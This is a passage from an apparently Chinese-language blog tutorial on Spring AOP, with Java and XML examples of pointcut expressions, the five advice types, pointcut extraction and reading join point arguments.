<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Target</span>  <span class="keyword">implements</span> <span class="title class_">TargetInterface</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;执行method......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>③ 创建切面类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;前置通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>④ 将目标类和切面类的对象创建权交给 Spring</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    目标对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;target&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.xml.Target&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    切面对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myAspect&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.xml.aspect.MyAspect&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>⑤ 配置织入关系</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    配置织入，告诉Spring框架，哪些方法（切点）需要进行增强配置（前置、后置）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    声明切面--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;myAspect&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--切面：切点 + 通知--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(public void com.tyt.xml.Target.method())&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(&quot;classpath:applicationContext.xml&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestXmlDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> TargetInterface target;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">		target.method();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155004.png"></p>
<h2 id="2-XML配置AOP详解"><a href="#2-XML配置AOP详解" class="headerlink" title="2. XML配置AOP详解"></a>2. XML配置AOP详解</h2><h3 id="1-切点表达式详解"><a href="#1-切点表达式详解" class="headerlink" title="1. 切点表达式详解"></a>1. 切点表达式详解</h3><p><strong>表达式语法：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">execution([修饰符] 返回值类型 包名.类名.方法名(参数))</span><br></pre></td></tr></table></figure>
<ul>
<li>访问修饰符可以省略</li>
<li>返回值类型、包名、类名、方法名可以使用星号<code>*</code>代表任意</li>
<li>包名与类名之间一个点 <code>.</code> 代表当前包下的类，两个点 <code>..</code> 表示当前包<code>及其</code>子包下的类</li>
<li>参数列表可以使用两个点 <code>..</code> 表示任意个数，任意类型的参数列表</li>
</ul>
<p><strong>e.g:</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="comment">&lt;!--指定完全--&gt;</span></span><br><span class="line">execution(public void com.tyt.aop.Target.method())</span><br><span class="line"><span class="comment">&lt;!--省略修饰符，任意方法、参数：Target 类下的任意方法任意参数--&gt;</span></span><br><span class="line">execution(void com.tyt.aop.Target.*(..)) </span><br><span class="line"><span class="comment">&lt;!--省略修饰符，任意类、方法、参数：aop包下的任意类的任意方法任意参数--&gt;</span></span><br><span class="line">execution(* com.tyt.aop.*.*(..)) </span><br><span class="line"> <span class="comment">&lt;!--省略修饰符，任意类、方法、参数：aop包及其子包的任意类的任意方法任意参数--&gt;</span></span><br><span class="line">execution(* com.tyt.aop..*.*(..))</span><br><span class="line"> <span class="comment">&lt;!--均任意--&gt;</span></span><br><span class="line">execution(* *..*.*(..))</span><br></pre></td></tr></table></figure>
<h3 id="2-通知类型"><a href="#2-通知类型" class="headerlink" title="2. 通知类型"></a>2. 通知类型</h3><p><strong>通知配置语法格式：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:通知类型</span> <span class="attr">method</span>=<span class="string">“切面类中方法名”</span> <span class="attr">pointcut</span>=<span class="string">&quot;切点表达式&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:通知类型</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>通知类型：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155004.png"></p>
<h4 id="1-前置通知（before）"><a href="#1-前置通知（before）" class="headerlink" title="1. 前置通知（before）"></a>1. 前置通知（before）</h4><blockquote>
<p>在上述入门案例演示的即为前置通知，它指定增强的方法在切入点方法之前执行。</p>
</blockquote>
<hr>
<h4 id="2-后置通知（after-returning）"><a href="#2-后置通知（after-returning）" class="headerlink" title="2. 后置通知（after-returning）"></a>2. 后置通知（after-returning）</h4><blockquote>
<p>指定增强的方法在切入点方法之后执行。</p>
</blockquote>
<p><strong>① 在切面类中配置后置增强方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;后置通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 配置织入关系</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    声明切面--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;myAspect&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--切面：切点 + 通知--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">&quot;afterReturning&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(public void com.tyt.xml.Target.method())&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155004.png"></p>
<hr>
<h4 id="3-环绕通知（around）"><a href="#3-环绕通知（around）" class="headerlink" title="3. 环绕通知（around）"></a>3. 环绕通知（around）</h4><blockquote>
<p>指定增强的方法在切入点方法之前与之后都执行。</p>
</blockquote>
<p><strong>① 在切面类中配置环绕增强方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	*</span></span><br><span class="line"><span class="comment">	*  <span class="doctag">@Params</span> ProceedingJoinPoint: 正在执行的连接点==切点</span></span><br><span class="line"><span class="comment">	*  <span class="doctag">@Return</span></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;环绕前通知......&quot;</span>);</span><br><span class="line">		<span class="comment">// 切点方法</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> proceedingJoinPoint.proceed();</span><br><span class="line">		System.out.println(<span class="string">&quot;环绕后通知......&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 配置织入关系</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    声明切面--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;myAspect&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--切面：切点 + 通知--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:around</span> <span class="attr">method</span>=<span class="string">&quot;around&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(public void com.tyt.xml.Target.method())&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<hr>
<h4 id="4-抛出异常通知（after-throwing）"><a href="#4-抛出异常通知（after-throwing）" class="headerlink" title="4. 抛出异常通知（after-throwing）"></a>4. 抛出异常通知（after-throwing）</h4><blockquote>
<p>指定增强的方法在出现异常时执行。</p>
</blockquote>
<p><strong>① 在切面类中配置异常抛出方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowing</span><span class="params">()</span>&#123;</span><br><span class="line">	 	System.out.println(<span class="string">&quot;异常抛出通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 配置织入关系</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    声明切面--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;myAspect&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--切面：切点 + 通知--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">&quot;afterThrowing&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(public void com.tyt.xml.Target.method())&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>③ 在执行方法中加入1 &#x2F; 0，制造bug</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Target</span>  <span class="keyword">implements</span> <span class="title class_">TargetInterface</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">		System.out.println(<span class="string">&quot;执行method......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<hr>
<h4 id="5-最终通知（after）"><a href="#5-最终通知（after）" class="headerlink" title="5. 最终通知（after）"></a>5. 最终通知（after）</h4><blockquote>
<p>指定增强的方法无论是否有异常都执行。</p>
</blockquote>
<p><strong>① 在切面类中配置最终通知方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;最终通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 配置织入关系</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    声明切面--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;myAspect&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--切面：切点 + 通知--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">&quot;afterThrowing&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(public void com.tyt.xml.Target.method())&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(public void com.tyt.xml.Target.method())&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>③ 在执行方法中加入1 &#x2F; 0，制造bug</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Target</span>  <span class="keyword">implements</span> <span class="title class_">TargetInterface</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">		System.out.println(<span class="string">&quot;执行method......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<h3 id="3-切点表达式的抽取"><a href="#3-切点表达式的抽取" class="headerlink" title="3. 切点表达式的抽取"></a>3. 切点表达式的抽取</h3><p>当多个增强的切点表达式相同时，可以将切点表达式进行抽取，在增强中使用 <code>pointcut-ref</code> 属性代替 <code>pointcut</code> 属性来引用抽取后的切点表达式。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置织入，告诉Spring框架，哪些方法（切点）需要进行增强配置（前置、后置）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    声明切面--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;myAspect&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--抽取切点表达式--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;myPointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(public void com.tyt.xml.Target.method())&quot;</span>/&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--切面：切点 + 通知--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--&lt;aop:before method=&quot;before&quot; pointcut=&quot;execution(public void com.tyt.xml.Target.method())&quot;/&gt;--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--&lt;aop:after-returning method=&quot;afterReturning&quot; pointcut=&quot;execution(public void com.tyt.xml.Target.method())&quot;/&gt;--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--&lt;aop:around method=&quot;around&quot; pointcut=&quot;execution(public void com.tyt.xml.Target.method())&quot;/&gt;--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--&lt;aop:after-throwing method=&quot;afterThrowing&quot; pointcut=&quot;execution(public void com.tyt.xml.Target.method())&quot;/&gt;--&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--&lt;aop:after method=&quot;after&quot; pointcut=&quot;execution(public void com.tyt.xml.Target.method())&quot;/&gt;--&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--使用 pointcut-ref 属性代替 pointcut 属性来引用抽取后的切点表达式--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;myPointcut&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">&quot;afterReturning&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;myPointcut&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:around</span> <span class="attr">method</span>=<span class="string">&quot;around&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;myPointcut&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">&quot;afterThrowing&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;myPointcut&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;myPointcut&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="四、-基于注解的AOP开发"><a href="#四、-基于注解的AOP开发" class="headerlink" title="四、 基于注解的AOP开发"></a>四、 基于注解的AOP开发</h1><h2 id="1-入门案例-1"><a href="#1-入门案例-1" class="headerlink" title="1. 入门案例"></a>1. 入门案例</h2><p><strong>① 创建目标接口和目标类（内部有切点）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TargetInterface</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Target</span>  <span class="keyword">implements</span> <span class="title class_">TargetInterface</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;执行method......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>② 创建切面类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;前置通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;后置通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	*</span></span><br><span class="line"><span class="comment">	*  <span class="doctag">@Params</span> ProceedingJoinPoint: 正在执行的连接点==切点</span></span><br><span class="line"><span class="comment">	*  <span class="doctag">@Return</span></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;环绕前通知......&quot;</span>);</span><br><span class="line">		<span class="comment">// 切点方法</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> proceedingJoinPoint.proceed();</span><br><span class="line">		System.out.println(<span class="string">&quot;环绕后通知......&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterThrowing</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;异常抛出通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;最终通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>③ 将目标类和切面类的对象创建权交给 Spring</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<p><strong>④ 在切面类中使用注解配置织入关系</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<p><strong>⑤ 定义Spring配置类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.tyt.anno&quot;)</span></span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(classes = &#123;SpringConfig.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestAnnoDemo</span> &#123;</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> TargetInterface target;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">		target.method();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<h2 id="2-注解配置AOP详解"><a href="#2-注解配置AOP详解" class="headerlink" title="2. 注解配置AOP详解"></a>2. 注解配置AOP详解</h2><h3 id="1-注解通知类型"><a href="#1-注解通知类型" class="headerlink" title="1. 注解通知类型"></a>1. 注解通知类型</h3><p><strong>配置语法：</strong></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">@通知注解(<span class="string">&quot;切点表达式&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>通知类型：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155005.png"></p>
<hr>
<h3 id="2-切点表达式的抽取"><a href="#2-切点表达式的抽取" class="headerlink" title="2.  切点表达式的抽取"></a>2.  切点表达式的抽取</h3><p>同 xml配置AOP一样，我们可以将切点表达式抽取。抽取方式是在切面内定义方法，在该方法上使用<code>@Pointcut</code>注解定义切点表达式，然后在在增强注解中进行引用。具体如下：</p>
<p><strong>① 定义切点表达式</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Component(&quot;myAspect&quot;)</span></span><br><span class="line"><span class="meta">@Aspect</span> <span class="comment">// 标注当前类是一个切面类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 定义切点表达式</span></span><br><span class="line">	<span class="meta">@Pointcut(&quot;execution(public void com.tyt.anno.Target.method())&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myPointcut</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 配置前置通知</span></span><br><span class="line">	<span class="comment">// @Before(&quot;execution(public void com.tyt.anno.Target.method())&quot;)</span></span><br><span class="line">	<span class="meta">@Before(&quot;myPointcut()&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;前置通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="五、AOP通知获取数据"><a href="#五、AOP通知获取数据" class="headerlink" title="五、AOP通知获取数据"></a>五、AOP通知获取数据</h1><ul>
<li>获取切入点方法的参数：<br>① <code>JoinPoint</code>：社用于前置（before）、后置（after-returning）、最终（after）、抛出异常（after-throwing）通知<br>② <code>PreceedJointPoint</code>：适用于环绕（around）通知</li>
</ul>
<hr>
<ul>
<li>获取切入点方法返回值：<br>① 后置通知（after-returning）<br>② 环绕通知（around）</li>
</ul>
<hr>
<ul>
<li>获取切入点方法运行异常信息<br>① 抛出异常通知（after-throwing）<br>② 环绕通知（around）</li>
</ul>
<hr>
<h2 id="1-获取切入点方法的参数"><a href="#1-获取切入点方法的参数" class="headerlink" title="1. 获取切入点方法的参数"></a>1. 获取切入点方法的参数</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JoinPoint对象</span></span><br><span class="line">Onject[] args = joinPoint.getArgs();</span><br><span class="line"><span class="comment">// ProceedingJoinPoint对象</span></span><br><span class="line">Onject[] args = proceedingJoinPoint.getArgs();</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component(&quot;myAspect&quot;)</span></span><br><span class="line"><span class="meta">@Aspect</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Pointcut(&quot;execution(public void com.tyt.anno.Target.method())&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myPointcut</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Before(&quot;myPointcut()&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(JoinPoint joinPoint)</span>&#123;</span><br><span class="line">		Object[] args = joinPoint.getArgs();</span><br><span class="line">		 System.out.println(<span class="string">&quot;前置，参数 = &quot;</span> + Arrays.toString(args));</span><br><span class="line">		System.out.println(<span class="string">&quot;前置通知......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">		Object[] args = proceedingJoinPoint.getArgs();</span><br><span class="line">		 System.out.println(<span class="string">&quot;环绕中，参数 = &quot;</span> + Arrays.toString(args));</span><br><span class="line">		System.out.println(<span class="string">&quot;环绕前通知......&quot;</span>);</span><br><span class="line">		<span class="comment">// 切点方法</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> proceedingJoinPoint.proceed();</span><br><span class="line">		System.out.println(<span 